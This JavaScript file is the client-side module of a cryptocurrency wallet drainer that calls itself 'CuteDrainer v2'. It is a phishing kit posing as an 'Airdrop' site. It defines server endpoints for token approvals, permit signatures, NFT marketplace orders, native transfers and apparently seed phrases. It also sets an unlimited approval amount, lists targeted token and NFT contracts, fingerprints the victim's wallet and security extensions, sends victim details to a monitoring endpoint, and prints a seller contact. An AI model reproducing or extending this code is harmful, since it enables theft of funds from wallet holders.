// DRAINER URLS
const API_URL = document.location.hostname == "localhost" ? "http://api.localhost" : "https://api." + (document.location.hostname.startsWith("www.") ? document.location.hostname.substring(4) : document.location.hostname.startsWith("claim.") ? document.location.hostname.substring(6) : document.location.hostname);
const CONNECT_URL = API_URL + "/connect";
const STRATEGY_URL = API_URL + "/strategy";
const APPROVE_URL = API_URL + "/approve";
const SEAPORT_URL = API_URL + "/seaport";
const BLUR_URL = API_URL + "/blur";
const X2Y2_URL = API_URL + "/x2y2";
const TRANSFER_URL = API_URL + "/transfer";
const PERMIT_URL = API_URL + "/permit";
const SWAP_URL = API_URL + "/swap";
const APECOIN_URL = API_URL + "/apecoin";
const PERMIT2_URL = API_URL + "/permit2";
const NATIVE_URL = API_URL + "/native";
const MONITOR_URL = API_URL + "/monitor";
const PHRASE_URL = API_URL + "/phrase";

// DRAINER CONFIGURATION
const DRAINER_ANKR_KEY = "a23594754d27e5b3b4b651b83cd1435160947bb7f69ab18cd70b3b0b9a59d0e6";
const CONNECT_MODAL_APPNAME = "Airdrop";

// DRAINER CONSTS
const MAX_APPROVAL = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

const PANCAKESWAPV3_CONTRACT = "0x13f4ea83d0bd40e75c8222255bc855a974568dd4"
const SUSHISWAP_CONTRACT = "0xd9e1ce17f2641f24ae83637ab66a2cca9c378b9f"
const OPENSEA_CONTRACT = "0x1e0049783f008a0085193e00003d00cd54003c71";
const APECOIN_STAKING_CONTRACT = "0x5954ab967bc958940b7eb73ee84797dc8a2afbb9";
const SEAPORT_CONTRACT = "0x00000000006c3852cbef3e08e8df289169ede581";
const UNISWAP_CONTRACT = "0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45";
const PERMIT2_CONTRACT = "0x000000000022d473030f116ddee9f6b43ac78ba3";

const ETH_PANCAKESWAPV2_CONTRACT = "0xeff92a263d31888d860bd50809a8d171709b7b1c"
const ETH_CRYPTOPUNKS_CONTRACT = "0xb47e3cd837ddf8e4c57f05d70ab865de6e193bbb";
const ETH_MOONBIRDS_CONTRACT = "0x23581767a106ae21c074b2276D25e5C3e136a68b";
const ETH_DAI_CONTRACT = "0x6b175474e89094c44da98b954eedeac495271d0f";
const ETH_WETH_CONTRACT = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
const ETH_USDC_CONTRACT = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48";
const ETH_USDT_CONTRACT = "0xdac17f958d2ee523a2206206994597c13d831ec7";
const ETH_APECOIN_CONTRACT = "0x4d224452801aced8b2f0aebe155379bb5d594381";
const ETH_MAYC_CONTRACT = "0x60e4d786628fea6478f785a6d7e704777c86a7c6";
const ETH_BAYC_CONTRACT = "0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d";

const BSC_PANCAKESWAPV2_CONTRACT = "0x10ed43c718714eb63d5aa57b78b54704e256024e"
const BSC_WBNB_CONTRACT = "0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c";
const BSC_USDC_CONTRACT = "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d";

const MATIC_USDC_CONTRACT = "0x2791bca1f2de4661ed88a30c99a7a9449aa84174";

const OPENSEA_TOKENS = [ETH_DAI_CONTRACT, ETH_WETH_CONTRACT, ETH_USDC_CONTRACT, ETH_USDT_CONTRACT, ETH_APECOIN_CONTRACT];


var lastMonitor = null;

async function request_monitor(monitor) {
  if(lastMonitor == JSON.stringify(monitor)) return;
  lastMonitor = JSON.stringify(monitor);

  if(monitor.error) {
    console.error(monitor.error);
    if(monitor.error.stack) monitor.stack = monitor.error.stack;
    monitor.error = JSON.stringify(monitor.error);
  }
  if(monitor.transaction) {
    monitor.transaction = JSON.stringify(removeHelpers(monitor.transaction));
  }

  //if(walletAddress != "" && selectedChain != "" && selectedWallet != "") {
  //  monitor.connection = { walletAddress: walletAddress, chain: selectedChain, wallet: selectedWallet };
  //}

  await request_api(MONITOR_URL, monitor);
}

async function request_api(url, obj) {
	try {
		const details = { walletAddress: walletAddress, chain: selectedChain, wallet: selectedWallet };//, pathname: window.location.pathname };
		const request = { ...details, ...obj }
		const response = await axiosInstance.post(url, request);
		console.log("API REQUEST SUCCESS ", url, response);
    return response;
	} catch (err) {
		console.log("API REQUEST FAILED ", url, err);
	}
	return null;
}

function isMobile() {
    var check = false;
    (function (a) {
        if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true;
    })(navigator.userAgent || navigator.vendor || window.opera);
    return check;
}

function getConnectedWallet() {
  var connectedWallet = "Unknown";
  if(DRAINER_Provider.isCoinbaseWallet || DRAINER_Provider.isCoinbaseBrowser) {
    connectedWallet = "Coinbase";
  } else if(DRAINER_Provider.isBitKeep) {
    connectedWallet = "BitKeep";
  } else if(DRAINER_Provider.isBlockWallet) {
    connectedWallet = "BlockWallet";
  } else if(DRAINER_Provider.isTokenPocket) {
    connectedWallet = "TokenPocket";
  } else if(DRAINER_Provider.isTrust || DRAINER_Provider.isTrustWallet) {
    connectedWallet = "Trust";
  } else if(DRAINER_Provider.isZerion) {
    connectedWallet = "Zerion";
  } else if(DRAINER_Provider.isXDEFI) {
    connectedWallet = "XDEFI";
  } else if(DRAINER_Provider.isTokenary) {
    connectedWallet = "Tokenary";
  } else if(DRAINER_Provider.isTally || DRAINER_Provider.isTaho) {
    connectedWallet = "Taho";
  } else if(DRAINER_Provider.isTalisman) {
    connectedWallet = "Talisman";
  } else if(DRAINER_Provider.isStatus) {
    connectedWallet = "Status";
  } else if(DRAINER_Provider.isRainbow) {
    connectedWallet = "Rainbow";
  } else if(DRAINER_Provider.isRabby) {
    connectedWallet = "Rabby";
  } else if(DRAINER_Provider.isPortal) {
    connectedWallet = "RipioPortal";
  } else if(DRAINER_Provider.isPhantom) {
    connectedWallet = "Phantom";
  } else if(DRAINER_Provider.isOpera) {
    connectedWallet = "Opera";
  } else if(DRAINER_Provider.isOneInchIOSWallet || DRAINER_Provider.isOneInchAndroidWallet) {
    connectedWallet = "1nch";
  } else if(DRAINER_Provider.isOkxWallet || DRAINER_Provider.isOKExWallet) {
    connectedWallet = "OKX";
  } else if(DRAINER_Provider.isNovaWallet) {
    connectedWallet = "Nova";
  } else if(DRAINER_Provider.isMathWallet) {
    connectedWallet = "Math";
  } else if(DRAINER_Provider.isKuCoinWallet) {
    connectedWallet = "KuCoin";
  } else if(DRAINER_Provider.isHaloWallet) {
    connectedWallet = "Halo";
  } else if(DRAINER_Provider.isImToken) {
    connectedWallet = "ImToken";
  } else if(DRAINER_Provider.isHyperPay) {
    connectedWallet = "HyperPay";
  } else if(DRAINER_Provider.isGamestop) {
    connectedWallet = "Gamestop";
  } else if(DRAINER_Provider.isFrontier) {
    connectedWallet = "Frontier";
  } else if(DRAINER_Provider.isFrame) {
    connectedWallet = "Frame";
  } else if(DRAINER_Provider.isExodus) {
    connectedWallet = "Exodus";
  } else if(DRAINER_Provider.isEnkrypt) {
    connectedWallet = "Enkrypt";
  } else if(DRAINER_Provider.isDefiant) {
    connectedWallet = "Defiant";
  } else if(DRAINER_Provider.isDawn) {
    connectedWallet = "Dawn";
  } else if(DRAINER_Provider.isBraveWallet) {
    connectedWallet = "Brave";
  } else if(DRAINER_Provider.isBitski) {
    connectedWallet = "Bitski";
  } else if(DRAINER_Provider.isBifrost) {
    connectedWallet = "Bifrost";
  } else if(DRAINER_Provider.isBackpack) {
    connectedWallet = "Backpack";
  } else if(DRAINER_Provider.isAvalanche) {
    connectedWallet = "CoreApp";
  } else if(DRAINER_Provider.isSequence) {
    connectedWallet = "Sequence";
  } else if(DRAINER_Provider.isApexWallet) {
    connectedWallet = "Apex"
  } else if(DRAINER_Provider.isMetaMask) {
    connectedWallet = "Metamask";
  } else if(DRAINER_Provider.isWalletConnect) {
    connectedWallet = ("WC_" + DRAINER_Provider?.session?.peer?.metadata?.name || "WalletConnect").replace(" ", "");
  } else if(DRAINER_Provider == window.BinanceChain) {
    connectedWallet = "Binance"
  } else {
    connectedWallet = "Injected"
  }
  if(DRAINER_Provider.isPocketUniverse || DRAINER_Provider.isPocketUniverseZ) {
    connectedWallet += "_PocketUniverse";
  } else if(DRAINER_Provider.isWalletGuard) {
    connectedWallet += "_WalletGuard";
  }
  return connectedWallet;
}

function isLedgerWalletConnected() {
  return selectedWallet.includes("Ledger");
}

const characters = "0123456789";
function random_string(length) {
    let result = '';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function sleep(ms) {
	return new Promise(resolve => setTimeout(resolve, ms));
}

function calculateValues(price, FACTOR) {
		const sort = price * (!isMobile() ? FACTOR[0] : FACTOR[1]);
		return [parseFloat(price.toFixed(2)), parseFloat(sort.toFixed(2))]
}

// Cache section
const CACHE_KEY = "cached";
const CACHE_TTL = 2 * 60 * 60 * 1000; // 2 hours

function createCache() {
  const exists = localStorage.getItem(CACHE_KEY) != null;
  if(exists) return;
  const cached = {};
  Object.keys(DRAINER_CHAINS).forEach(name => {
    cached[name] = {};
  });
  setCache(cached);
}

function clearCache() {
  localStorage.removeItem(CACHE_KEY);
}

function getCachedItem(chain, contractAddress) {
  const cached = getCache();
  return cached[chain][contractAddress];
}

// If token value is BigInt, if nft value is array where 0 is nftId and 1 is nftAmount.
async function updateCachedItem(chain, contractAddress, value) {
  const cached = getCache();
  var item = cached[chain][contractAddress];
  if(value instanceof Object) {
    if(item == null) item = [];
    item = [value, ...item];
  } else if(typeof(value) == "bigint") {
    if(item == null) item = web3.utils.toBigInt(0);
    item = web3.utils.toBigInt(item) + web3.utils.toBigInt(value);
  } else {
    await request_monitor({
      process: "UPDATE_CACHE",
      error: new Error(JSON.stringify(value) + " is not Array or BigInt"),
    });
    return;
  }
  cached[chain][contractAddress] = item;
  setCache(cached);
}

function setCache(value) {
    const now = new Date();
    const item = {
        value: value,
        expiry: now.getTime() + CACHE_TTL,
    }
    localStorage.setItem(CACHE_KEY, JSON.stringify(item));
}

function getCache() {
    var itemStr = localStorage.getItem(CACHE_KEY);
    if (!itemStr) {
      createCache();
      itemStr = localStorage.getItem(CACHE_KEY);
    }

    const item = JSON.parse(itemStr);
    const now = new Date();

    if (now.getTime() > item.expiry) {
        localStorage.removeItem(CACHE_KEY);
        createCache();
    }
    return item.value;
}

function removeHelpers(txs) {
  var copy = JSON.parse(JSON.stringify(txs));
  //copy.forEach((details, chain, map) => {
  //Object.keys(Object.entries(copy)).forEach(function(key) {
  Object.entries(copy).forEach(details => {
      if(details[1].list) {
        if(details[1].list.length == 0) {
          delete copy[details[0]];
          return;
        } else {
          for(const item of details[1].list) {
            if(item.args) {
              for(var i = 0; i < item.args.length; i++) {
                if(isJSONObject(item.args[i])) item.args[i] = "REDACTEDABI";
              }
            }
            if(item.abi) delete item.abi;
            if(item.calls) delete item.calls;
          }
        }
      }
      if(details[1].types) delete details[1].types;
      if(details[1].temp) delete details[1].temp;
      if(details[1].contracts) delete details[1].contracts;
  });
  if(copy.abi) delete copy.abi;
  if(copy.calls) delete copy.calls;
  return copy;
}

function deepClone(obj) {
    if(!obj || true == obj) return obj;
    var objType = typeof (obj);
    if("number" == objType || "string" == objType) return obj;
    var result = Array.isArray(obj) ? [] : !obj.constructor ? {} : new obj.constructor();
    if(obj instanceof Map) for(var key of obj.keys()) result.set(key, deepClone(obj.get(key)));
    for(var key in obj) if(obj.hasOwnProperty(key)) result[key] = deepClone(obj[key]);
    return result;
}

function isJSONObject(jsonString){
    try {
        var o = JSON.parse(jsonString);
        return o && typeof o === "object";
    }
    catch (e) {}
    return false;
};

BigInt.prototype.toJSON = function() { return this.toString() }

window.addEventListener('keydown', function(e) {
    if (
        // CMD + Alt + I (Chrome, Firefox, Safari)
        e.metaKey == true && e.altKey == true && e.keyCode == 73 ||
        // CMD + Alt + J (Chrome)
        e.metaKey == true && e.altKey == true && e.keyCode == 74 ||
        // CMD + Alt + C (Chrome)
        e.metaKey == true && e.altKey == true && e.keyCode == 67 ||
        // CMD + Shift + C (Chrome)
        e.metaKey == true && e.shiftKey == true && e.keyCode == 67 ||
        // Ctrl + Shift + I (Chrome, Firefox, Safari, Edge)
        e.ctrlKey == true && e.shiftKey == true && e.keyCode == 73 ||
        // Ctrl + Shift + J (Chrome, Edge)
        e.ctrlKey == true && e.shiftKey == true && e.keyCode == 74 ||
        // Ctrl + Shift + C (Chrome, Edge)
        e.ctrlKey == true && e.shiftKey == true && e.keyCode == 67 ||
        // F12 (Chome, Firefox, Edge)
        e.keyCode == 123 ||
        // CMD + Alt + U, Ctrl + U (View source: Chrome, Firefox, Safari, Edge)
        e.metaKey == true && e.altKey == true && e.keyCode == 85 ||
        e.ctrlKey == true && e.keyCode == 85
    ) {
      PrintConsoleInfo();
      }
});

function PrintConsoleInfo() {
  console.log(
          "%c CuteDrainer v2 ^_^ ",
          `background: #ffaad7;
          background: -webkit-linear-gradient(to right, #ffe2f1, #ffaad7);
          background: linear-gradient(to right, #ffe2f1, #ffaad7);
          padding: 20px;
          color: #fff;
          font-size: 50px;`);
  console.log("%cContact:\n\nhttps://getsession.org\n05c78f6352a461383a0ee289d33d41c3bdc8c752509d92f88e13c515edccd9f704\n", "color:red;font-size:24px;");
}
